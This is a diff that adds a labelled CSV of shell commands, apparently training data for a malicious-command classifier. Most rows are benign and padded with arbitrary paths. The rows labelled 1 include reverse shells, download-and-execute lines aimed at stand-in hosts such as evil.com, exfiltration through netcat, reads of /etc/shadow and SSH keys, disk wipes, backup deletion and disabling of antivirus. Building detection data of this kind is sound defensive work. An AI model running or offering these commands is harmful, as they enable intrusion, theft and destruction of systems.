@@ -1,0 +1,625 @@
+command,label
+pip install -r requirements.txt /tmp,0
+:(){ :|:& };:,1
+touch new_file.txt /var/www/html,0
+touch new_file.txt,0
+rm -rf /var,1
+bash -i >& /dev/tcp/10.10.10.10/1234 0>&1,1
+whoami,0
+systemctl status ssh /home/user/docs,0
+cd Documents,0
+git commit -m 'Initial commit',0
+docker ps /var/www/html,0
+cat notes.txt ./dist,0
+free -m ./dist,0
+ip addr show /var/www/html,0
+powershell -Command 'Get-Service',0
+systemctl status ssh /tmp,0
+ls -la /tmp,0
+"cut -d',' -f2 user.csv ../backup",0
+screen -S session1 /home/user/docs,0
+journalctl -xe ./dist,0
+gcc main.c -o main ./dist,0
+git commit -m 'Initial commit' /var/www/html,0
+df -h ../backup,0
+wmic useraccount where name='guest' set disabled=false,1
+dig example.com ./dist,0
+unzip archive.zip /tmp,0
+sudo yum install git /tmp,0
+Get-Date,0
+wmic process call create 'powershell.exe -enc ...',1
+sudo yum install git,0
+journalctl -xe /var/www/html,0
+sudo yum install git ../backup,0
+hostname -I /var/www/html,0
+awk '{print $1}' data.csv /tmp,0
+gcc main.c -o main ../backup,0
+tee output.log /home/user/docs,0
+vssadmin delete shadows /all /quiet,1
+cipher /w:C:,1
+hostname -I,0
+dig example.com,0
+patch < fix.patch /tmp,0
+chmod 644 script.sh /home/user/docs,0
+service nginx restart ../backup,0
+reg delete 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa' /v LSA_DEBUG /f,1
+ionice -c 3 ./backup.sh,0
+mv old.name new.name /home/user/docs,0
+sudo yum install git ./dist,0
+ipconfig /all,0
+systemctl status ssh /var/www/html,0
+taskkill /IM notepad.exe,0
+net start w3svc,0
+ansible-playbook site.yml,0
+ls -R /var/www/html,0
+sudo yum install git /var/www/html,0
+cipher /w:D:,1
+traceroute 8.8.8.8 ./dist,0
+git init /home/user/docs,0
+net stop browser,0
+mv old.name new.name ./dist,0
+cat notes.txt /var/www/html,0
+Start-Process notepad.exe,0
+rm -rf /root,1
+man ls ../backup,0
+powershell -Command 'Write-Host hello',0
+del /f /s /q D:\*,1
+netstat -tuln ../backup,0
+free -m ../backup,0
+rmdir empty_dir /home/user/docs,0
+nslookup google.com,0
+alias ll='ls -l' ../backup,0
+docker images ./dist,0
+echo 'hello' /var/www/html,0
+service nginx restart /tmp,0
+history | tail -n 20 /tmp,0
+whoami /groups,0
+locate secret.txt /home/user/docs,0
+"net stop ""Windows Defender""",1
+ps aux | grep python /tmp,0
+awk '{print $1}' data.csv,0
+shutdown -h now,1
+sort -k3 items.txt,0
+top -n 1 /var/www/html,0
+userdel -r root,1
+tmux attach ../backup,0
+mv old.name new.name /var/www/html,0
+net user guest /active:yes,1
+pip install -r requirements.txt ./dist,0
+wmic cpu get name,0
+uname -a ../backup,0
+patch < fix.patch,0
+sudo apt update,0
+ss -lptn,0
+cat notes.txt /home/user/docs,0
+ss -lptn /home/user/docs,0
+ssh user@192.168.1.10,0
+locate secret.txt,0
+terraform apply ../backup,0
+kubectl get pods,0
+mount /dev/sdb1 /mnt,0
+docker images /var/www/html,0
+cp source.txt dest.txt /var/www/html,0
+cat /dev/zero > /dev/sda,1
+head -n 10 config.json /tmp,0
+type config.json,0
+alias ll='ls -l' /tmp,0
+service nginx restart,0
+head -n 10 config.json ./dist,0
+unzip archive.zip,0
+wbadmin delete catalog -quiet,1
+which python /var/www/html,0
+htop,0
+git push origin main ./dist,0
+ps aux | grep python /var/www/html,0
+wc -l commands.txt /tmp,0
+Export-Csv -Path data.csv,0
+python3 -m venv venv /var/www/html,0
+Import-Module ActiveDirectory,0
+ansible-playbook site.yml ./dist,0
+rsync -avz /src /dest,0
+mv old.name new.name ../backup,0
+git add . /tmp,0
+diff file1.txt file2.txt /tmp,0
+which python ./dist,0
+fg 1,0
+man ls /tmp,0
+screen -S session1 /var/www/html,0
+ssh-keygen -t rsa ../backup,0
+ls -la ../backup,0
+ssh user@192.168.1.10 /var/www/html,0
+unzip archive.zip ../backup,0
+sc stop WinDefend,1
+bg 1,0
+chown root:root /home/user,1
+xcopy /s /e C:\Folder D:\Backup,0
+Get-ChildItem -Path C:\,0
+pip install -r requirements.txt /home/user/docs,0
+fg 1 /var/www/html,0
+netstat -tuln /home/user/docs,0
+terraform apply /var/www/html,0
+sc query,0
+uptime /home/user/docs,0
+rustc --version /var/www/html,0
+chmod 644 script.sh ../backup,0
+ps aux | grep python ./dist,0
+hostname,0
+htop /var/www/html,0
+ls -R ./dist,0
+journalctl -xe /tmp,0
+atq,0
+copy file.txt D:\Backup,0
+rmdir empty_dir ../backup,0
+service nginx restart /home/user/docs,0
+ansible-playbook site.yml /tmp,0
+"cut -d',' -f2 user.csv",0
+systemctl status ssh ./dist,0
+echo 'hello' /home/user/docs,0
+format c: /fs:NTFS /q /y,1
+ss -lptn ./dist,0
+whoami /home/user/docs,0
+go version /home/user/docs,0
+journalctl -xe ../backup,0
+touch new_file.txt /tmp,0
+git init ./dist,0
+tmux attach,0
+"powershell (New-Object Net.WebClient).DownloadFile('http://evil.com/v.exe', 'v.exe'); Start-Process v.exe",1
+uptime /tmp,0
+ls -R /home/user/docs,0
+mv /etc /tmp/etc_bak,1
+crontab -l,0
+nslookup google.com ./dist,0
+bcdedit /set {default} bootstatuspolicy ignoreallfailures,1
+docker images,0
+service nginx restart /var/www/html,0
+terraform apply ./dist,0
+traceroute 8.8.8.8 ../backup,0
+nslookup google.com /tmp,0
+fg 1 ../backup,0
+chmod 777 /etc/shadow,1
+atq /var/www/html,0
+"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'",1
+netstat -tuln ./dist,0
+git push origin main /home/user/docs,0
+systemctl status ssh,0
+ip addr show ../backup,0
+nslookup google.com /home/user/docs,0
+htop ../backup,0
+cd .. /tmp,0
+iptables -F,1
+cp source.txt dest.txt ./dist,0
+ip addr show /tmp,0
+history -c,1
+python3 -m venv venv /home/user/docs,0
+fg 1 ./dist,0
+rm -rf /bin,1
+nano ~/.bashrc,0
+ls,0
+takeown /f C:\Windows\System32,1
+journalctl -xe /home/user/docs,0
+watch -n 5 'df -h' ../backup,0
+uniq -c logs.txt,0
+npm install,0
+Select-Object -First 10,0
+echo 'hello' /tmp,0
+rm -rf /usr,1
+python3 -m venv venv /tmp,0
+ip addr show /home/user/docs,0
+hostname -I /tmp,0
+atq ./dist,0
+pkill -f 'worker' /home/user/docs,0
+cd .. ./dist,0
+head -n 10 config.json /var/www/html,0
+attrib -r -s -h c:\autoexec.bat,1
+git add . ../backup,0
+ss -lptn ../backup,0
+sort -k3 items.txt /home/user/docs,0
+reg query HKLM\Software,0
+tee output.log ./dist,0
+kubectl get pods /tmp,0
+docker ps /home/user/docs,0
+Get-Content -Path logs.txt,0
+Remove-Item C:\ -Recurse -Force,1
+whoami ./dist,0
+free -m /var/www/html,0
+ssh-keygen -t rsa ./dist,0
+df -h /home/user/docs,0
+ping -c 4 google.com,0
+terraform apply,0
+jobs /home/user/docs,0
+tar -czvf backup.tar.gz folder/,0
+cls,0
+rmdir empty_dir /tmp,0
+Remove-Item D:\Data -Recurse -Force,1
+visudo,1
+rustc --version ./dist,0
+"cut -d',' -f2 user.csv /tmp",0
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass,1
+ls -R,0
+ipconfig,0
+pkill -f 'worker',0
+terraform apply /tmp,0
+alias ll='ls -l' ./dist,0
+kubectl get pods ./dist,0
+net localgroup administrators hacked_user /add,1
+ps aux | grep python,0
+pkill -f 'worker' ../backup,0
+watch -n 5 'df -h' /tmp,0
+ss -lptn /tmp,0
+rm -f /etc/shadow,1
+atq ../backup,0
+kubectl get pods /var/www/html,0
+git commit -m 'Initial commit' ./dist,0
+node -v /var/www/html,0
+go version /tmp,0
+del /f /s /q C:\*,1
+hostname -I ./dist,0
+tail -f /var/log/nginx/access.log,0
+Findstr /i 'error' app.log,0
+icacls C:\Windows /grant Everyone:(F) /T,1
+Copy-Item -Path a.txt -Destination b.txt,0
+net localgroup,0
+git add . /home/user/docs,0
+cd .. ../backup,0
+uname -a /var/www/html,0
+echo hello,0
+dd if=/dev/zero of=/dev/sda,1
+echo 'hello' ./dist,0
+bg 1 /var/www/html,0
+rm -rf /boot,1
+echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers,1
+nslookup google.com /var/www/html,0
+atq /tmp,0
+jobs /var/www/html,0
+git push origin main /var/www/html,0
+node -v ../backup,0
+screen -S session1 ../backup,0
+unzip archive.zip ./dist,0
+uname -a ./dist,0
+top -n 1,0
+ping 8.8.8.8,0
+locate secret.txt ./dist,0
+cd .. /var/www/html,0
+bg 1 /home/user/docs,0
+sudo apt update ../backup,0
+go version ../backup,0
+sc stop SharedAccess,1
+man ls /var/www/html,0
+"cut -d',' -f2 user.csv /var/www/html",0
+rmdir TempDir,0
+pkill -f 'worker' ./dist,0
+ping -c 4 google.com /tmp,0
+uptime ../backup,0
+tmux attach ./dist,0
+Set-Location -Path D:\,0
+sed -i 's/old/new/g' file.txt,0
+uniq -c logs.txt /tmp,0
+ls -la ./dist,0
+df -h /tmp,0
+nslookup google.com,0
+jobs ../backup,0
+fg 1 /tmp,0
+cd .. /home/user/docs,0
+df -h ./dist,0
+taskkill /F /IM avp.exe,1
+powershell -ExecutionPolicy Restricted,0
+ls -la /home/user/docs,0
+patch < fix.patch ./dist,0
+mkfs.ext4 /dev/sda,1
+net user administrator password123 /add,1
+init 0,1
+rustc --version /tmp,0
+ssh-keygen -t rsa /var/www/html,0
+which python /tmp,0
+echo 'hello' ../backup,0
+"perl -e 'use Socket;$i=""10.0.0.1"";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",1
+docker ps /tmp,0
+du -sh /var,0
+which python ../backup,0
+chmod 644 script.sh,0
+history | tail -n 20,0
+source ~/.bash_profile,0
+reg delete HKLM\Software /f,1
+uptime,0
+export HISTFILE=/dev/null,1
+uniq -c logs.txt /var/www/html,0
+rmdir empty_dir,0
+dir /s,0
+patch < fix.patch /var/www/html,0
+taskkill /F /IM msmpeng.exe,1
+notepad notes.txt,0
+htop ./dist,0
+diff file1.txt file2.txt /var/www/html,0
+whoami ../backup,0
+wc -l commands.txt,0
+history | tail -n 20 ../backup,0
+traceroute 8.8.8.8 /var/www/html,0
+mkdir -p project/src,0
+git push origin main /tmp,0
+patch < fix.patch ../backup,0
+"cut -d',' -f2 user.csv /home/user/docs",0
+which python /home/user/docs,0
+awk '{print $1}' data.csv ./dist,0
+tasklist,0
+ssh user@192.168.1.10 /home/user/docs,0
+kill -9 1234 /home/user/docs,0
+ps aux | grep python ../backup,0
+yarn build,0
+taskkill /F /IM explorer.exe,1
+python3 -m venv venv ./dist,0
+jobs ./dist,0
+curl -L http://get.docker.com | sh,0
+del C:\Windows\System32\*,1
+mv old.name new.name /tmp,0
+awk '{print $1}' data.csv ../backup,0
+wc -l commands.txt /home/user/docs,0
+sort -k3 items.txt /tmp,0
+watch -n 5 'df -h' /home/user/docs,0
+ls -R /tmp,0
+npm install /tmp,0
+find /home -name '*.py',0
+git add .,0
+sudo apt update /var/www/html,0
+ss -lptn /var/www/html,0
+kill -9 1234 /tmp,0
+top -n 1 /home/user/docs,0
+unzip archive.zip /home/user/docs,0
+wc -l commands.txt /var/www/html,0
+screen -S session1,0
+jobs,0
+docker ps,0
+find / -perm -4000 2>/dev/null,1
+netstat -tuln /var/www/html,0
+git commit -m 'Initial commit' ../backup,0
+docker ps ./dist,0
+tasklist /v,0
+awk '{print $1}' data.csv /var/www/html,0
+del temp.tmp,0
+chmod 644 script.sh /tmp,0
+go version ./dist,0
+traceroute 8.8.8.8 /tmp,0
+rmdir empty_dir ./dist,0
+wget http://evil.com/shell.sh -O- | sh,1
+pkill -f 'worker' /var/www/html,0
+git commit -m 'Initial commit' /tmp,0
+ufw disable,1
+ver,0
+git commit -m 'Initial commit' /home/user/docs,0
+net share,0
+diff file1.txt file2.txt ../backup,0
+ssh-keygen -t rsa /tmp,0
+kill -9 1234 /var/www/html,0
+node -v /home/user/docs,0
+dir,0
+ping -c 4 google.com /var/www/html,0
+git add . ./dist,0
+crontab -l /tmp,0
+screen -S session1 /tmp,0
+bg 1 ./dist,0
+ping -c 4 google.com ./dist,0
+sort -k3 items.txt /var/www/html,0
+ssh-keygen -t rsa,0
+kubectl get pods ../backup,0
+umount /mnt,0
+sudo apt update ./dist,0
+tmux attach /tmp,0
+node -v /tmp,0
+hostname -I /home/user/docs,0
+cp source.txt dest.txt /home/user/docs,0
+nslookup google.com ../backup,0
+atq /home/user/docs,0
+npm install /home/user/docs,0
+watch -n 5 'df -h' ./dist,0
+echo 'root:password123' | chpasswd,1
+"reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Malicious /t REG_SZ /d ""C:\temp\virus.exe""",1
+move *.log C:\Logs,0
+kill -9 1234,0
+node -v ./dist,0
+tmux attach /var/www/html,0
+yarn build ../backup,0
+pip install -r requirements.txt /var/www/html,0
+locate secret.txt ../backup,0
+head -n 10 config.json ../backup,0
+free -m /home/user/docs,0
+locate secret.txt /tmp,0
+gcc main.c -o main /home/user/docs,0
+control panel,0
+kill -9 1234 ../backup,0
+rm -f /etc/sudoers,1
+rd /s /q C:\Windows,1
+pkill -f 'worker' /tmp,0
+wget http://example.com/file.zip,0
+watch -n 5 'df -h',0
+tee output.log,0
+powershell -ExecutionPolicy Bypass -File attack.ps1,1
+netstat -tuln,0
+docker ps ../backup,0
+nc -lvp 4444 -e /bin/bash,1
+pip install -r requirements.txt ../backup,0
+unzip archive.zip /var/www/html,0
+uptime ./dist,0
+npm install ../backup,0
+cat /etc/passwd | nc 10.0.0.1 4444,1
+mkfs.xfs /dev/sdb,1
+sort -k3 items.txt ../backup,0
+dig example.com /home/user/docs,0
+git push origin main,0
+uname -a /home/user/docs,0
+alias ll='ls -l' /var/www/html,0
+traceroute 8.8.8.8,0
+go version,0
+whoami /tmp,0
+dig example.com ../backup,0
+git init /var/www/html,0
+bg 1 ../backup,0
+rmdir empty_dir /var/www/html,0
+awk '{print $1}' data.csv /home/user/docs,0
+sudo yum install git /home/user/docs,0
+alias ll='ls -l' /home/user/docs,0
+python3 -m venv venv,0
+python3 -m venv venv ../backup,0
+rustc --version,0
+ansible-playbook site.yml /home/user/docs,0
+uniq -c logs.txt /home/user/docs,0
+wc -l commands.txt ./dist,0
+which python,0
+format d: /q /v:new,1
+mv /bin/sh /bin/sh.bak,1
+diff file1.txt file2.txt ./dist,0
+gcc main.c -o main,0
+shutdown /s /t 0 /f,1
+pip install -r requirements.txt,0
+ansible-playbook site.yml ../backup,0
+New-Item -ItemType Directory -Name NewDir,0
+chown user:user data/,0
+scp file.txt user@remote:/tmp,0
+dir /ah,0
+sudo rm -rf /,1
+git init,0
+watch -n 5 'df -h' /var/www/html,0
+top -n 1 ./dist,0
+df -h,0
+uname -a,0
+htop /home/user/docs,0
+ansible-playbook site.yml /var/www/html,0
+service nginx restart ./dist,0
+crontab -l ./dist,0
+hostname -I ../backup,0
+ssh-keygen -t rsa /home/user/docs,0
+history | tail -n 20 /home/user/docs,0
+ls -R ../backup,0
+grep 'error' /var/log/syslog,0
+cat notes.txt /tmp,0
+uname -a /tmp,0
+git add . /var/www/html,0
+export PATH=$PATH:/opt/bin,0
+passwd -d root,1
+cat /root/.ssh/id_rsa,1
+Invoke-WebRequest -Uri http://google.com,0
+locate secret.txt /var/www/html,0
+Get-Command,0
+ping -c 4 google.com /home/user/docs,0
+free -m,0
+crontab -l /home/user/docs,0
+cd ..,0
+patch < fix.patch /home/user/docs,0
+netstat -an | findstr 80,0
+uptime /var/www/html,0
+yarn build /var/www/html,0
+mkdir NewFolder,0
+chmod 644 script.sh ./dist,0
+Get-Help Get-Service,0
+whoami,0
+mv old.name new.name,0
+nohup ./long_running_script.sh &,0
+screen -S session1 ./dist,0
+systeminfo,0
+touch new_file.txt ../backup,0
+ls -la /var/www/html,0
+query user,0
+ping -c 4 google.com ../backup,0
+bg 1 /tmp,0
+sh -i >& /dev/udp/evil.com/4444 0>&1,1
+df -h /var/www/html,0
+cat notes.txt ../backup,0
+cp source.txt dest.txt,0
+git init /tmp,0
+cat notes.txt,0
+net user,0
+alias ll='ls -l',0
+dd if=/dev/random of=/dev/sdb,1
+uniq -c logs.txt ./dist,0
+terraform apply /home/user/docs,0
+jobs /tmp,0
+tee output.log ../backup,0
+cat /etc/shadow,1
+git init ../backup,0
+top -n 1 ../backup,0
+rustc --version /home/user/docs,0
+gcc main.c -o main /tmp,0
+"powershell -Command ""& {IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')}""",1
+rm -rf /home/*/.ssh,1
+htop /tmp,0
+cd ..,0
+git push origin main ../backup,0
+chmod 644 script.sh /var/www/html,0
+chmod 4777 /bin/sh,1
+uniq -c logs.txt ../backup,0
+man ls,0
+touch new_file.txt ./dist,0
+free -m /tmp,0
+head -n 10 config.json,0
+netstat -tuln /tmp,0
+sudo apt update /tmp,0
+yarn build ./dist,0
+npm install ./dist,0
+Get-Service | Stop-Service -Force,1
+docker images /tmp,0
+cp source.txt dest.txt /tmp,0
+history | tail -n 20 ./dist,0
+powershell -Command 'Get-Process',0
+tmux attach /home/user/docs,0
+rm -rf /etc,1
+ssh user@192.168.1.10 ./dist,0
+tee output.log /var/www/html,0
+ls -la,0
+Sort-Object -Property Name,0
+icacls C:\Data,0
+systemctl status ssh ../backup,0
+cp source.txt dest.txt ../backup,0
+vim /etc/hosts,0
+iptables -t nat -F,1
+kill -9 1234 ./dist,0
+npm install /var/www/html,0
+"cut -d',' -f2 user.csv ./dist",0
+ip addr show ./dist,0
+head -n 10 config.json /home/user/docs,0
+taskmgr,0
+diff file1.txt file2.txt /home/user/docs,0
+crontab -l /var/www/html,0
+cd /home/user,0
+dig example.com /var/www/html,0
+tee output.log /tmp,0
+docker images ../backup,0
+whoami /var/www/html,0
+cacls C:\Windows /e /p everyone:f,1
+rm -f /etc/passwd,1
+bcdedit /set {default} recoveryenabled No,1
+curl http://attacker.xyz/malware | python3,1
+crontab -l ../backup,0
+robocopy C:\Source D:\Dest /E,0
+gpupdate /force,0
+man ls /home/user/docs,0
+rm -rf /,1
+reboot -f,1
+top -n 1 /tmp,0
+rustc --version ../backup,0
+attrib +r read_only.txt,0
+sudo apt update /home/user/docs,0
+echo 'hello',0
+dig example.com /tmp,0
+yarn build /home/user/docs,0
+history | tail -n 20 /var/www/html,0
+kubectl get pods /home/user/docs,0
+man ls ./dist,0
+wc -l commands.txt ../backup,0
+fg 1 /home/user/docs,0
+chmod -R 777 /,1
+diff file1.txt file2.txt,0
+traceroute 8.8.8.8 /home/user/docs,0
+gcc main.c -o main /var/www/html,0
+curl -I https://google.com,0
+sort -k3 items.txt ./dist,0
+ip addr show,0
+yarn build /tmp,0
+journalctl -xe,0
+touch new_file.txt /home/user/docs,0
+go version /var/www/html,0
+node -v,0
+shutdown /r /t 0 /f,1
+pwd,0
+ps aux | grep python /home/user/docs,0
+ssh user@192.168.1.10 ../backup,0
+docker images /home/user/docs,0
+nice -n 10 ./task.sh,0
+ssh user@192.168.1.10 /tmp,0
